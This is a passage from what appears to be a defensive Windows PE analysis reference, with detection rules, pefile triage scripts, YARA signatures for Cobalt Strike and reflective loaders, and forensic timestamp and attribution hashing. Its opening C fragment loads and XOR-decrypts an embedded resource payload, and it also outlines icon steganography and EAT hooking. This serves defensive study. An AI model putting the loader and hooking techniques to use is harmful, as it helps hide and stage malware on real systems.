    *out_size = SizeofResource(hModule, hRes);
    LPVOID locked = LockResource(hGlob);
    if (!locked) return FALSE;

    /* Decrypt in place or copy to writable buffer */
    *out_buf = VirtualAlloc(NULL, *out_size,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);
    if (!*out_buf) return FALSE;
    memcpy(*out_buf, locked, *out_size);

    /* XOR decryption example (single-byte key) */
    BYTE key = 0x42;
    for (DWORD i = 0; i < *out_size; i++)
        ((PBYTE)*out_buf)[i] ^= key;

    return TRUE;
}
```

**Icon steganography.** PE icon resources are stored as device-independent bitmap data (DIB) within `RT_GROUP_ICON`/`RT_ICON` entries. An attacker can append data after the valid icon pixel data or embed it in the least-significant bits of the color channels. The icon displays normally, but the extra bytes carry a payload. Detection: parse the icon resource, compute the expected size from the BITMAPINFOHEADER dimensions and bit depth, and flag any resource where actual size exceeds expected size by more than a small alignment allowance.

**Resource enumeration for triage:**

```python
#!/usr/bin/env python3
"""Enumerate PE resources and flag suspicious RT_RCDATA entries."""
import pefile
import math
import sys

def entropy(data):
    if len(data) == 0:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    length = len(data)
    return -sum(
        (f / length) * math.log2(f / length)
        for f in freq if f > 0
    )

RESOURCE_TYPES = {
    1: "RT_CURSOR", 2: "RT_BITMAP", 3: "RT_ICON", 4: "RT_MENU",
    5: "RT_DIALOG", 6: "RT_STRING", 7: "RT_FONTDIR", 8: "RT_FONT",
    9: "RT_ACCELERATOR", 10: "RT_RCDATA", 11: "RT_MESSAGETABLE",
    12: "RT_GROUP_CURSOR", 14: "RT_GROUP_ICON", 16: "RT_VERSION",
    24: "RT_MANIFEST",
}

def analyze_resources(path):
    pe = pefile.PE(path)
    if not hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
        print("No resources.")
        pe.close()
        return

    for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        type_name = RESOURCE_TYPES.get(entry.id, f"TYPE_{entry.id}")
        if hasattr(entry, 'directory'):
            for sub in entry.directory.entries:
                if hasattr(sub, 'directory'):
                    for leaf in sub.directory.entries:
                        data_rva = leaf.data.struct.OffsetToData
                        size = leaf.data.struct.Size
                        data = pe.get_data(data_rva, size)
                        ent = entropy(data)
                        flags = []
                        if ent > 7.0 and size > 256:
                            flags.append("HIGH_ENTROPY")
                        if size > 1048576:
                            flags.append("LARGE (>1MB)")
                        if type_name == "RT_RCDATA" and size > 4096:
                            flags.append("REVIEW_RCDATA")
                        # Check for MZ header in resource
                        if len(data) > 2 and data[0:2] == b'MZ':
                            flags.append("EMBEDDED_PE")
                        flag_str = " | ".join(flags) if flags else ""
                        print(f"  {type_name:<20} ID={sub.id or sub.name:<6} "
                              f"Size={size:>8} Entropy={ent:.2f} {flag_str}")
    pe.close()

if __name__ == "__main__":
    analyze_resources(sys.argv[1])
```

### 26.5 Export Address Table (EAT) hooking

While §20.3 covers IAT hooking (redirecting imports), EAT hooking modifies the exporting DLL's export table so that subsequent `GetProcAddress` calls resolve to attacker code. The attacker patches the `AddressOfFunctions` array in the export directory: replacing the RVA of the target function with the RVA of a detour function (or an inline forwarder string pointing to attacker code).

EAT hooks persist across any module that dynamically resolves the function after the hook is installed, whereas IAT hooks only affect the specific module whose IAT was patched. Detection: for each export in a loaded module, compare the `AddressOfFunctions` RVA against the on-disk value from the PE file. A mismatch indicates a hook.

---

## 27. PE Detection Engineering

This section consolidates detection logic into actionable rules, expanding beyond the YARA rules in §22 and the Sigma rules in §24. The focus is on detection patterns not previously covered and on automation tooling for PE triage at scale.

### 27.1 Detection rules for PE anomalies

**Rule 1: Oversized PE headers.** The combined size of the DOS header, PE signature, COFF file header, optional header, and section table rarely exceeds 4 KB for legitimate binaries. Headers spanning tens of kilobytes may contain embedded data (shellcode, configuration, encrypted blobs) in the header padding area between the last section header and `SizeOfHeaders`.

```python
def check_header_padding(pe):
    """Flag excessive padding between section table end and SizeOfHeaders."""
    last_header_offset = (
        pe.OPTIONAL_HEADER.get_file_offset() +
        pe.FILE_HEADER.SizeOfOptionalHeader +
        pe.FILE_HEADER.NumberOfSections * 40  # sizeof(IMAGE_SECTION_HEADER)
    )
    padding = pe.OPTIONAL_HEADER.SizeOfHeaders - last_header_offset
    if padding > 4096:
        print(f"[!] Excessive header padding: {padding} bytes "
              f"(offset 0x{last_header_offset:x} to 0x"
              f"{pe.OPTIONAL_HEADER.SizeOfHeaders:x})")
        return True
    return False
```

**Rule 2: PE timestamp anomalies.** Compile timestamps in the future, before 1990, or set to zero on unsigned binaries warrant investigation. Reproducible builds use a content hash in the timestamp field and declare `IMAGE_DEBUG_TYPE_REPRO` (debug directory type 16); the absence of that debug entry with a hash-like timestamp is anomalous.

```python
import datetime

def check_timestamp(pe):
    """Flag suspicious TimeDateStamp values."""
    ts = pe.FILE_HEADER.TimeDateStamp
    if ts == 0:
        print("[!] TimeDateStamp is zero (stripped or intentionally zeroed)")
        return True

    try:
        dt = datetime.datetime.utcfromtimestamp(ts)
    except (OSError, ValueError):
        print(f"[!] TimeDateStamp 0x{ts:08x} is not a valid epoch value")
        return True

    now = datetime.datetime.utcnow()
    if dt > now:
        print(f"[!] TimeDateStamp in the future: {dt.isoformat()}")
        return True
    if dt.year < 1990:
        print(f"[!] TimeDateStamp implausibly old: {dt.isoformat()}")
        return True

    # Check for REPRO debug entry when timestamp looks like a hash
    has_repro = False
    if hasattr(pe, 'DIRECTORY_ENTRY_DEBUG'):
        for dbg in pe.DIRECTORY_ENTRY_DEBUG:
            if dbg.struct.Type == 16:  # IMAGE_DEBUG_TYPE_REPRO
                has_repro = True
                break
    # Hash-like timestamps have high entropy in their hex representation
    hex_ts = f"{ts:08x}"
    unique_chars = len(set(hex_ts))
    if unique_chars >= 7 and not has_repro:
        print(f"[!] Hash-like timestamp 0x{ts:08x} without REPRO debug entry")

    return False
```

**Rule 3: Missing ASLR or DEP in modern binaries.** Any PE compiled after 2010 that lacks `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` (0x0040) or `IMAGE_DLLCHARACTERISTICS_NX_COMPAT` (0x0100) is either ancient, deliberately weakened for exploitation, or a hardening failure.

```yara
import "pe"

rule missing_aslr_dep {
    meta:
        description = "PE missing ASLR or DEP — hardening deficiency or deliberate weakening"
        severity    = "HIGH"
    condition:
        uint16(0) == 0x5A4D and
        pe.is_pe and
        (
            not (pe.dll_characteristics & 0x0040) or
            not (pe.dll_characteristics & 0x0100)
        )
}
```

**Rule 4: Anomalous import table.** Legitimate binaries import at minimum kernel32.dll (or ntdll.dll for native images). A PE with zero imports or only `GetProcAddress`/`LoadLibraryA` typically resolves all dependencies dynamically — a hallmark of packed or manually loaded payloads.

```python
def check_imports(pe):
    """Flag binaries with no imports or suspiciously minimal import tables."""
    if not hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        print("[!] No import directory — likely packed or manually mapped")
        return True

    total_funcs = sum(
        len(entry.imports) for entry in pe.DIRECTORY_ENTRY_IMPORT
    )
    dll_names = [
        entry.dll.decode('utf-8', errors='replace').lower()
        for entry in pe.DIRECTORY_ENTRY_IMPORT
    ]
    func_names = set()
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        for imp in entry.imports:
            if imp.name:
                func_names.add(imp.name.decode('utf-8', errors='replace'))

    if total_funcs <= 3:
        resolver_set = {'GetProcAddress', 'LoadLibraryA', 'LoadLibraryW',
                        'GetModuleHandleA', 'GetModuleHandleW'}
        if func_names.issubset(resolver_set):
            print(f"[!] Minimal imports ({total_funcs} functions, "
                  f"all resolvers): {', '.join(func_names)}")
            return True

    if len(dll_names) == 1 and total_funcs <= 5:
        print(f"[!] Single DLL import with {total_funcs} functions: "
              f"{dll_names[0]}")
    return False
```

**Rule 5: Non-standard entry point location.** The entry point should fall within the first executable section (typically `.text`). An entry point in a non-executable section, in the header area, or past `SizeOfImage` indicates manipulation.

```python
def check_entry_point(pe):
    """Verify entry point falls within an executable code section."""
    ep_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    if ep_rva == 0:
        if not (pe.FILE_HEADER.Characteristics & 0x2000):  # Not a DLL
            print("[!] Entry point is zero on a non-DLL image")
            return True
        return False  # DLLs may have EP=0 (no DllMain)

    ep_in_section = False
    for sec in pe.sections:
        sec_start = sec.VirtualAddress
        sec_end = sec_start + max(sec.Misc_VirtualSize, sec.SizeOfRawData)
        if sec_start <= ep_rva < sec_end:
            ep_in_section = True
            is_exec = bool(sec.Characteristics & 0x20000000)
            sec_name = sec.Name.decode('utf-8', errors='replace').rstrip('\x00')
            if not is_exec:
                print(f"[!] Entry point in non-executable section: "
                      f"{sec_name} (chars=0x{sec.Characteristics:08x})")
                return True
            if sec_name not in ('.text', '.code', 'CODE', '.TEXT'):
                print(f"[!] Entry point in unusual section: {sec_name}")
            break

    if not ep_in_section:
        print(f"[!] Entry point RVA 0x{ep_rva:08x} falls outside all sections")
        return True
    return False
```

**Rule 6: Suspicious TLS callbacks on user-mode executables.** Legitimate user-mode EXEs rarely use TLS callbacks. DLLs use them more frequently (for thread-local initialization), but even then, multiple callbacks or callbacks in non-standard sections are suspicious.

**Rule 7: Debug directory with no PDB path on unsigned binary.** Legitimate release builds almost always retain a CodeView PDB reference. Stripping the PDB path while leaving the debug directory is a red flag for malware trying to hinder analysis while retaining some debug infrastructure.

**Rule 8: Section name inconsistency.** Sections named `.text0`, `.text1`, or other variants of standard names (`.reloc1`, `.rsrc0`) indicate section injection or packer artifacts. The canonical section names are `.text`, `.rdata`, `.data`, `.rsrc`, `.reloc`, `.pdata`, `.edata`, `.idata`, `.tls`, `.CRT`, `.bss`.

### 27.2 YARA rules for advanced threats

The rules below complement §22's anomaly-focused rules with threat-specific signatures.

```yara
import "pe"
import "math"

rule cobalt_strike_beacon_pe {
    meta:
        description = "Cobalt Strike beacon PE indicators"
        severity    = "CRITICAL"
        reference   = "https://blog.didierstevens.com/2020/11/07/1768-k/"
    strings:
        /* Beacon config magic (encoded with default 0x69 XOR key) */
        $config_start = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }
        /* Sleep mask deobfuscation stub */
        $sleep_mask = { 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 }
        /* Named pipe default patterns */
        $pipe1 = "\\\\.\\pipe\\msagent_" ascii
        $pipe2 = "\\\\.\\pipe\\MSSE-" ascii
        $pipe3 = "\\\\.\\pipe\\postex_" ascii
        /* Default User-Agent fragments */
        $ua1 = "Mozilla/5.0 (compatible; MSIE" ascii
        $ua2 = "Mozilla/4.0 (compatible; MSIE" ascii
    condition:
        uint16(0) == 0x5A4D and pe.is_pe and
        (
            $config_start or
            $sleep_mask or
            (any of ($pipe*) and any of ($ua*))
        )
}

rule reflective_loader_generic {
    meta:
        description = "Generic reflective PE loader stub signatures"
        severity    = "CRITICAL"
    strings:
        /* Stephen Fewer's ReflectiveLoader export name */
        $export_name = "ReflectiveLoader" ascii
        /* Common reflective loader patterns: walk PEB to find kernel32 */
        $peb_walk_x64 = {
            65 48 8B 04 25 60 00 00 00  /* mov rax, gs:[0x60] (PEB) */
            48 8B 40 18                  /* mov rax, [rax+0x18] (PEB_LDR_DATA) */
            48 8B 40 ??                  /* mov rax, [rax+XX] (InXxxOrderModuleList) */
        }
        $peb_walk_x86 = {
            64 A1 30 00 00 00           /* mov eax, fs:[0x30] (PEB) */
            8B 40 0C                    /* mov eax, [eax+0x0C] (PEB_LDR_DATA) */
            8B 40 ??                    /* mov eax, [eax+XX] */
        }
        /* Hash-based API resolution (ROR13 hash loop) */
        $ror13_loop = {
            C1 CF 0D                    /* ror edi, 0xD */
            01 ??                       /* add edi, eXX */
        }
    condition:
        uint16(0) == 0x5A4D and pe.is_pe and
        (
            $export_name or
            ($peb_walk_x64 and $ror13_loop) or
            ($peb_walk_x86 and $ror13_loop)
        )
}

rule vmprotect_pe_packed {
    meta:
        description = "VMProtect-packed PE with virtualized code sections"
        severity    = "MEDIUM"
    condition:
        uint16(0) == 0x5A4D and pe.is_pe and
        for any i in (0..pe.number_of_sections - 1) : (
            (pe.sections[i].name == ".vmp0" or
             pe.sections[i].name == ".vmp1" or
             pe.sections[i].name == ".vmp2") and
            math.entropy(pe.sections[i].raw_data_offset,
                         pe.sections[i].raw_data_size) > 7.0
        )
}

rule themida_winlicense_pe {
    meta:
        description = "Themida/WinLicense packed PE"
        severity    = "MEDIUM"
    condition:
        uint16(0) == 0x5A4D and pe.is_pe and
        for any i in (0..pe.number_of_sections - 1) : (
            pe.sections[i].name == ".themida" or
            pe.sections[i].name == ".winlice"
        )
}
```

### 27.3 PE analysis automation

**pestudio** (winitor.com). Free static analyzer for Windows PEs. Automatically flags: suspicious imports (injection APIs, anti-debug APIs), missing mitigations, anomalous sections, blacklisted strings, VirusTotal integration, and resource anomalies. The XML-based configuration (`pestudio.xml`) is extensible with custom indicator lists.

**peframe** (open-source, Python). CLI tool that extracts: antidbg/antivm API calls, suspicious API combinations, packer signatures, URL/IP/domain strings, and Authenticode status. Produces JSON output for pipeline integration.

```bash
# peframe CLI usage
pip install peframe
peframe --json suspicious_binary.exe | python3 -m json.tool

# Key output fields:
#   "antidbg": list of anti-debugging API imports
#   "antivm": list of VM-detection API imports
#   "suspicious_api": categorized API usage (injection, keylogging, etc.)
#   "packer": detected packer signatures
#   "url": extracted URLs from strings
```

**pefile Python library** — the workhorse for PE analysis scripting. All code examples in §23, §26, and this section use it. Key automation patterns:

```python
#!/usr/bin/env python3
"""Comprehensive PE triage report using pefile."""
import pefile
import hashlib
import sys
import json
from datetime import datetime, timezone

def triage(path):
    with open(path, 'rb') as f:
        raw = f.read()

    report = {}
    report['md5'] = hashlib.md5(raw).hexdigest()
    report['sha256'] = hashlib.sha256(raw).hexdigest()
    report['size'] = len(raw)

    pe = pefile.PE(data=raw)

    # Imphash — standard import hash for clustering
    report['imphash'] = pe.get_imphash()

    # Compile timestamp
    ts = pe.FILE_HEADER.TimeDateStamp
    report['compile_ts_raw'] = f"0x{ts:08x}"
    try:
        report['compile_ts_utc'] = datetime.fromtimestamp(
            ts, tz=timezone.utc
        ).isoformat()
    except (OSError, ValueError):
        report['compile_ts_utc'] = "INVALID"

    # Machine type
    machines = {0x14c: "x86", 0x8664: "x64", 0xAA64: "ARM64"}
    report['machine'] = machines.get(
        pe.FILE_HEADER.Machine,
        f"0x{pe.FILE_HEADER.Machine:04x}"
    )

    # DllCharacteristics flags
    dc = pe.OPTIONAL_HEADER.DllCharacteristics
    report['mitigations'] = {
        'ASLR': bool(dc & 0x0040),
        'HighEntropyVA': bool(dc & 0x0020),
        'DEP': bool(dc & 0x0100),
        'CFG': bool(dc & 0x4000),
        'ForceIntegrity': bool(dc & 0x0080),
        'NX_COMPAT': bool(dc & 0x0100),
        'NO_SEH': bool(dc & 0x0400),
    }

    # Sections summary
    report['sections'] = []
    for sec in pe.sections:
        name = sec.Name.decode('utf-8', errors='replace').rstrip('\x00')
        report['sections'].append({
            'name': name,
            'virtual_size': sec.Misc_VirtualSize,
            'raw_size': sec.SizeOfRawData,
            'characteristics': f"0x{sec.Characteristics:08x}",
            'entropy': round(sec.get_entropy(), 2),
        })

    # Import DLLs
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        report['imports'] = [
            entry.dll.decode('utf-8', errors='replace')
            for entry in pe.DIRECTORY_ENTRY_IMPORT
        ]
    else:
        report['imports'] = []

    pe.close()
    return report

if __name__ == "__main__":
    r = triage(sys.argv[1])
    print(json.dumps(r, indent=2))
```

### 27.4 Authenticode signature verification and anomaly detection

Authenticode verification goes beyond "is it signed?" to "is the signature valid, is the chain trusted, and are there anomalies in the certificate or the hash coverage?"

```powershell
# PowerShell: comprehensive Authenticode check
function Test-PESignature {
    param([string]$Path)

    $sig = Get-AuthenticodeSignature -FilePath $Path

    $result = [PSCustomObject]@{
        Path            = $Path
        Status          = $sig.Status
        StatusMessage   = $sig.StatusMessage
        SignerCert      = $sig.SignerCertificate.Subject
        Issuer          = $sig.SignerCertificate.Issuer
        Thumbprint      = $sig.SignerCertificate.Thumbprint
        NotBefore       = $sig.SignerCertificate.NotBefore
        NotAfter        = $sig.SignerCertificate.NotAfter
        IsTimestamped   = $null -ne $sig.TimeStamperCertificate
        TimestampCert   = $sig.TimeStamperCertificate.Subject
        IsOSBinary      = $sig.IsOSBinary
    }

    # Anomaly checks
    $anomalies = @()

    if ($sig.Status -eq 'NotSigned') {
        $anomalies += "UNSIGNED"
    }
    elseif ($sig.Status -ne 'Valid') {
        $anomalies += "INVALID_SIG: $($sig.StatusMessage)"
    }

    if ($sig.SignerCertificate) {
        # Expired certificate at signing time (without timestamp)
        if (-not $result.IsTimestamped -and
            $sig.SignerCertificate.NotAfter -lt (Get-Date)) {
            $anomalies += "EXPIRED_NO_TIMESTAMP"
        }
        # Self-signed (issuer == subject)
        if ($sig.SignerCertificate.Subject -eq $sig.SignerCertificate.Issuer) {
            $anomalies += "SELF_SIGNED"
        }
        # Very short validity period (< 30 days) — test certificates
        $validity = ($sig.SignerCertificate.NotAfter -
                     $sig.SignerCertificate.NotBefore).TotalDays
        if ($validity -lt 30) {
            $anomalies += "SHORT_VALIDITY: $([int]$validity) days"
        }
    }

    $result | Add-Member -NotePropertyName Anomalies -NotePropertyValue $anomalies
    return $result
}

# Usage
Test-PESignature -Path "C:\Windows\System32\notepad.exe" | Format-List

# Batch scan a directory
Get-ChildItem -Path "C:\suspect" -Filter "*.exe" -Recurse |
  ForEach-Object { Test-PESignature -Path $_.FullName } |
  Where-Object { $_.Anomalies.Count -gt 0 } |
  Format-Table Path, Status, Anomalies -AutoSize
```

**signtool.exe verification (Windows SDK):**

```cmd
:: Verify Authenticode signature and certificate chain
signtool.exe verify /pa /v suspicious.exe

:: Verify with catalog-based verification (for OS binaries)
signtool.exe verify /pa /a /v C:\Windows\System32\notepad.exe

:: Key output to inspect:
:: - "Signing Certificate Chain" — full chain from leaf to root
:: - "The signature is timestamped" — presence/absence
:: - "Number of files successfully Verified" vs. "Number of errors"
```

Common Authenticode anomalies for detection:

| Anomaly | Meaning |
|---------|---------|
| Valid signature with expired certificate, no timestamp | Certificate expired after signing; without a timestamp, the OS may reject it |
| Signature covers only part of the file | CVE-2013-3900 — data appended after the certificate table |
| Catalog-signed but catalog missing | Binary relies on a `.cat` file that was removed or is from a different OS version |
| Self-signed certificate | Test certificate or attacker-created certificate; not trusted by default |
| Certificate CN mimics legitimate vendor | Typosquatting: "Micros0ft Corporation", "Goog1e LLC" |
| Dual-signed (SHA-1 + SHA-256) with mismatched signers | Different entities signed each hash algorithm; unusual for legitimate software |

---

## 28. PE Forensics

### 28.1 PE timeline analysis

A PE carries multiple independent timestamps that, when correlated, reveal the binary's provenance and detect tampering:

| Timestamp | Location | Meaning |
|-----------|----------|---------|
| COFF `TimeDateStamp` | `IMAGE_FILE_HEADER` offset 4 | Link time (or content hash if REPRO) |
| Debug directory `TimeDateStamp` | Each `IMAGE_DEBUG_DIRECTORY` entry | Debug info generation time |
| Export directory `TimeDateStamp` | `IMAGE_EXPORT_DIRECTORY` offset 4 | Export table link time |
| Resource directory `TimeDateStamp` | `IMAGE_RESOURCE_DIRECTORY` offset 4 | Resource compilation time (often zero) |
| Authenticode timestamp | PKCS#7 countersignature | When the binary was signed (trusted, from TSA) |
| Rich header `comp.id` values | Between DOS stub and PE signature | Compiler/linker build tool versions |

**Correlation logic:** In a legitimately built binary, the COFF timestamp, debug directory timestamp, and export directory timestamp should be identical or within seconds of each other (they are set during the same link pass). The Authenticode timestamp should be equal to or later than the compile timestamp. A Rich header encoding tools from a newer Visual Studio version than the compile timestamp implies is contradictory.

```python
#!/usr/bin/env python3
"""Extract and correlate all PE timestamps for forensic timeline analysis."""
import pefile
import struct
import sys
from datetime import datetime, timezone

def ts_to_str(ts):
    if ts == 0:
        return "0 (not set)"
    try:
        return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat()
    except (OSError, ValueError):
        return f"0x{ts:08x} (invalid)"

def extract_timestamps(path):
    pe = pefile.PE(path)
    timestamps = {}

    # COFF header
    timestamps['coff_link'] = pe.FILE_HEADER.TimeDateStamp

    # Export directory
    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        timestamps['export'] = pe.DIRECTORY_ENTRY_EXPORT.struct.TimeDateStamp
    else:
        timestamps['export'] = None

    # Debug directories
    if hasattr(pe, 'DIRECTORY_ENTRY_DEBUG'):
        for i, dbg in enumerate(pe.DIRECTORY_ENTRY_DEBUG):
            timestamps[f'debug_{i}_type{dbg.struct.Type}'] = \
                dbg.struct.TimeDateStamp

    # Resource directory (if present)
    res_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[2]
    if res_dir.VirtualAddress and res_dir.Size:
        try:
            res_data = pe.get_data(res_dir.VirtualAddress, 16)
            res_ts = struct.unpack_from('<I', res_data, 4)[0]
            timestamps['resource'] = res_ts
        except Exception:
            timestamps['resource'] = None
    else:
        timestamps['resource'] = None

    print(f"PE timestamp analysis: {path}\n")
    base_ts = timestamps['coff_link']
    for name, ts in timestamps.items():
        if ts is None:
            print(f"  {name:<30} N/A")
            continue
        delta = ""
        if name != 'coff_link' and ts != 0 and base_ts != 0:
            diff = ts - base_ts
            if abs(diff) > 60:
                delta = f"  [DELTA: {diff:+d}s from COFF]"
        print(f"  {name:<30} {ts_to_str(ts)}{delta}")

    pe.close()

if __name__ == "__main__":
    extract_timestamps(sys.argv[1])
```

### 28.2 Rich header analysis for attribution

The Rich header is an undocumented Microsoft structure between the DOS stub and the PE signature. It records every `comp.id` (compiler/linker tool ID + build number) that contributed to the binary. Because different Visual Studio versions, build configurations, and SDK versions produce distinct `comp.id` sets, the Rich header serves as a build-environment fingerprint.

**Structure:** The Rich header is XOR-encoded with a 32-bit key. The cleartext begins with `DanS` (0x536E6144) and ends with `Rich` followed by the key. Each entry is two DWORDs: `(tool_id << 16 | tool_version)` and `count`.

```python
#!/usr/bin/env python3
"""Parse PE Rich header for compiler attribution and clustering."""
import struct
import hashlib
import sys

TOOL_IDS = {
    0x01: "Import (old)",
    0x04: "Linker (link.exe)",
    0x06: "Resource compiler (rc.exe)",
    0x0A: "Assembler (masm/ml.exe)",
    0x0F: "Linker (link.exe, newer)",
    0x5D: "C compiler (cl.exe, VS2003)",
    0x5E: "C++ compiler (cl.exe, VS2003)",
    0x60: "C compiler (VS2005)",
    0x61: "C++ compiler (VS2005)",
    0x83: "C compiler (VS2008)",
    0x84: "C++ compiler (VS2008)",
    0x93: "Linker (VS2010)",
    0x94: "C compiler (VS2010)",
    0x95: "C++ compiler (VS2010)",
    0xAA: "Linker (VS2012)",
    0xAB: "C compiler (VS2012)",
    0xAC: "C++ compiler (VS2012)",
    0xCE: "C compiler (VS2013)",
    0xCF: "C++ compiler (VS2013)",
    0xD9: "C compiler (VS2015)",
    0xDA: "C++ compiler (VS2015)",
    0xEB: "C compiler (VS2015 Update 3+)",
    0xFD: "Linker (VS2017)",
    0xFE: "C compiler (VS2017)",
    0xFF: "C++ compiler (VS2017)",
    0x100: "Assembler (VS2017)",
    0x104: "C compiler (VS2019)",
    0x105: "C++ compiler (VS2019)",
    0x106: "Assembler (VS2019)",
    0x108: "Linker (VS2019)",
    0x113: "C compiler (VS2022)",
    0x114: "C++ compiler (VS2022)",
}

def parse_rich_header(path):
    with open(path, 'rb') as f:
        data = f.read()

    # Find "Rich" marker
    rich_idx = data.find(b'Rich')
    if rich_idx == -1:
        print("No Rich header found.")
        return None

    # XOR key is the 4 bytes after "Rich"
    key = struct.unpack_from('<I', data, rich_idx + 4)[0]

    # Decode backward from Rich to find "DanS"
    # The encoded "DanS" = 0x536E6144 XOR key
    dans_enc = struct.pack('<I', 0x536E6144 ^ key)
    dans_idx = data.rfind(dans_enc, 0, rich_idx)
    if dans_idx == -1:
        print("Rich header corrupt: DanS marker not found.")
        return None

    # Decrypt the Rich header
    enc_data = data[dans_idx:rich_idx]
    clear = bytearray(len(enc_data))
    for i in range(0, len(enc_data), 4):
        val = struct.unpack_from('<I', enc_data, i)[0]
        struct.pack_into('<I', clear, i, val ^ key)

    # Skip DanS + 3 padding DWORDs (16 bytes total)
    entries = []
    for i in range(16, len(clear), 8):
        comp_id = struct.unpack_from('<I', clear, i)[0]
        count = struct.unpack_from('<I', clear, i + 4)[0]
        tool_id = (comp_id >> 16) & 0xFFFF
        build = comp_id & 0xFFFF
        entries.append((tool_id, build, count))

    # Rich header hash (MD5 of raw Rich header bytes — used for clustering)
    rich_hash = hashlib.md5(data[dans_idx:rich_idx + 8]).hexdigest()

    print(f"Rich header analysis: {path}")
    print(f"XOR key: 0x{key:08x}")
    print(f"Rich hash (MD5): {rich_hash}\n")
    print(f"{'Tool ID':<8} {'Build':<8} {'Count':<8} {'Description'}")
    print("-" * 70)
    for tool_id, build, count in entries:
        desc = TOOL_IDS.get(tool_id, f"Unknown (0x{tool_id:04x})")
        print(f"0x{tool_id:04x}   {build:<8} {count:<8} {desc}")

    return {'key': key, 'hash': rich_hash, 'entries': entries}

if __name__ == "__main__":
    parse_rich_header(sys.argv[1])
```

The Rich header hash is a powerful clustering pivot: binaries compiled in the same build environment (same Visual Studio version, same SDK, same project configuration) produce identical Rich header hashes. Kaspersky, ESET, and other vendors use Rich header hashes to link malware samples to campaigns and build environments. Notable case: the Olympic Destroyer malware (2018) contained a forged Rich header mimicking Lazarus Group tooling — a false-flag operation attributed to Sandworm/GRU by Kaspersky after Rich header analysis revealed inconsistencies with the actual compiler artifacts in the code.

### 28.3 Overlay data extraction and analysis

Overlay data is any content appended after the last section's raw data in the PE file. The PE loader ignores it — only the content within defined sections is mapped. Attackers append encrypted payloads, configuration blobs, or entire additional PEs as overlay data.

```python
#!/usr/bin/env python3
"""Extract and analyze PE overlay data."""
import pefile
import hashlib
import math
import sys

def analyze_overlay(path):
    pe = pefile.PE(path)
    overlay_offset = pe.get_overlay_data_start_offset()

    if overlay_offset is None:
        print("No overlay data.")
        pe.close()
        return

    with open(path, 'rb') as f:
        f.seek(overlay_offset)
        overlay = f.read()

    file_size = pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData
    overlay_size = len(overlay)
    total_size = overlay_offset + overlay_size

    print(f"Overlay analysis: {path}")
    print(f"  Overlay offset:  0x{overlay_offset:08x}")
    print(f"  Overlay size:    {overlay_size:,} bytes "
          f"({overlay_size / total_size * 100:.1f}% of file)")
    print(f"  SHA-256:         {hashlib.sha256(overlay).hexdigest()}")

    # Entropy
    if overlay_size > 0:
        freq = [0] * 256
        for b in overlay:
            freq[b] += 1
        ent = -sum(
            (f / overlay_size) * math.log2(f / overlay_size)
            for f in freq if f > 0
        )
        print(f"  Entropy:         {ent:.2f}")
        if ent > 7.5:
            print("  [!] High entropy — likely encrypted or compressed")

    # Check for embedded PE
    if overlay[:2] == b'MZ':
        print("  [!] Overlay starts with MZ — embedded PE detected")
    # Check for PK (ZIP)
    if overlay[:2] == b'PK':
        print("  [!] Overlay starts with PK — embedded ZIP/archive")
    # Check for Authenticode certificate
    cert_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
    if cert_dir.VirtualAddress == overlay_offset:
        print("  [*] Overlay is the Authenticode certificate table")

    pe.close()

if __name__ == "__main__":
    analyze_overlay(sys.argv[1])
```

### 28.4 PE-to-campaign attribution hashes

Several hash types compress PE characteristics into pivotable identifiers for threat intelligence correlation:

**Import hash (imphash).** Mandiant-originated. Concatenates all imported DLL names and function names (lowercased, ordered as they appear in the import directory), then MD5-hashes the result. Binaries compiled from the same source with the same imports produce the same imphash, regardless of section content changes. `pefile` computes it natively: `pe.get_imphash()`.

**Section hash.** Hash of each section's name, raw size, virtual size, and characteristics. Captures the binary's structural layout without content dependency. Useful for clustering binaries from the same builder/framework.

**Rich header hash.** As computed in §28.2 — MD5 of the decoded Rich header bytes. Clusters by build environment.

**TypeRef hash (for .NET).** Hash of the `TypeRef` metadata table entries in a .NET assembly. Captures the external type dependencies without depending on obfuscated method names or strings.

**SSDEEP / TLSH.** Fuzzy hashes that tolerate minor content changes. SSDEEP (context-triggered piecewise hashing) and TLSH (Trend Micro Locality Sensitive Hash) are useful for finding variants of the same malware family where exact hashes diverge due to recompilation or configuration changes.

```python
#!/usr/bin/env python3
"""Compute multiple attribution hashes for a PE file."""
import pefile
import hashlib
import struct
import sys

def compute_section_hash(pe):
    """Hash based on section table structure (name + sizes + chars)."""
    h = hashlib.md5()
    for sec in pe.sections:
        h.update(sec.Name)
        h.update(struct.pack('<III',
                             sec.Misc_VirtualSize,
                             sec.SizeOfRawData,
                             sec.Characteristics))
    return h.hexdigest()

def compute_rich_hash(path):
    """MD5 of the decoded Rich header."""
    with open(path, 'rb') as f:
        data = f.read(4096)  # Rich header is always in the first few KB
    rich_idx = data.find(b'Rich')
    if rich_idx == -1:
        return None
    key = struct.unpack_from('<I', data, rich_idx + 4)[0]
    dans_enc = struct.pack('<I', 0x536E6144 ^ key)
    dans_idx = data.rfind(dans_enc, 0, rich_idx)
    if dans_idx == -1:
        return None
    return hashlib.md5(data[dans_idx:rich_idx + 8]).hexdigest()

def attribution_hashes(path):
    pe = pefile.PE(path)
    with open(path, 'rb') as f:
        raw = f.read()

    print(f"Attribution hashes: {path}\n")
    print(f"  MD5:           {hashlib.md5(raw).hexdigest()}")
    print(f"  SHA-256:       {hashlib.sha256(raw).hexdigest()}")
    print(f"  Imphash:       {pe.get_imphash()}")
    print(f"  Section hash:  {compute_section_hash(pe)}")
    rich = compute_rich_hash(path)
    print(f"  Rich hash:     {rich if rich else 'N/A (no Rich header)'}")
    pe.close()

if __name__ == "__main__":
    attribution_hashes(sys.argv[1])
```

